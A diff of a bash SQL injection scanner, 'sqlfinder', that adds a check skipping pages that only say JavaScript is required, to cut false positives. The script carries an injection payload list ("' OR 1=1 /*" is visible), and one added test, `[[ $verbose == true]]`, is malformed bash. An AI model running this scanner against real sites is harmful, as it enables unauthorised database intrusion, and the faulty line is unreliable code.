@@ -1,5 +1,5 @@
 #!/bin/bash
-# sqlfinder v1.4
+# sqlfinder v1.6
 #Intensive scan enabled
 #Added Count Check on pages
 # ---------------- Colors ----------------
@@ -142,7 +142,7 @@ collect_urls() {
   | sed 's/=[^&[:space:]]*/=/'
 }
 
-# ---------------- Curl helper ----------------
+# ---------------- Curl helper with body response ----------------
 curl_cmd() {
   local url="$1"
   local output
@@ -156,6 +156,13 @@ curl_cmd() {
   echo "$url" 1>&2
   fi 
   echo "$output"  
+}
+
+# ---------------- Curl body helper (for JavaScript check) ----------------
+curl_body() {
+  curl -s \
+    ${header:+-H "$header"} \
+    "$1"
 }
 
 # ---------------- Curl time helper ----------------
@@ -220,6 +227,9 @@ declare -a payloads=(
     "' OR 1=1 /*"
 )
 
+
+
+
 # URL encode a payload
 url_encode() {
     local payload="$1"
@@ -238,6 +248,10 @@ url_encode() {
         s/|/%7C/g
     '
 }
+
+
+
+
 
 # Function to append payload to URL based on existing parameters
 append_payload() {
@@ -260,12 +274,43 @@ append_payload() {
     fi
 }
 
+# Add this array for false positive response patterns
+declare -a falsePositiveResponse=(
+    "You need to enable JavaScript to run this app"
+    "Please enable JavaScript"
+    "JavaScript is required"
+    "enable javascript"
+    "requires JavaScript"
+    "This application requires JavaScript"
+    "JavaScript must be enabled"
+    "Please turn on JavaScript"
+)
+
+
 # ---------------- Scan loop ----------------
 echo "$urls" | while IFS= read -r url; do
   [ -z "$url" ] && continue
   vulnerable=false
   
- 
+  # ---- Stage 0: False positive response check (FIRST check before anything else)
+  body_response=$(curl_body "$url")
+  skip_url=false
+  
+  for pattern in "${falsePositiveResponse[@]}"; do
+    if echo "$body_response" | grep -qi "$pattern"; then
+      if [[ $verbose == true]]; then
+      echo -e "${YELLOW}[-] Skipping (false positive): $url${NC}"
+      echo -e "${BLUE}  Reason: Contains pattern: \"$pattern\"${NC}"
+      fi
+      skip_url=true
+      break
+    fi
+  done
+  
+  if [ "$skip_url" = true ]; then
+    continue
+  fi
+  
   # ---- Stage 1: base check (skip dead only)
   base_code=$(curl_cmd "$url")
   if [ "$base_code" = "000" ] || [ -z "$base_code" ]; then
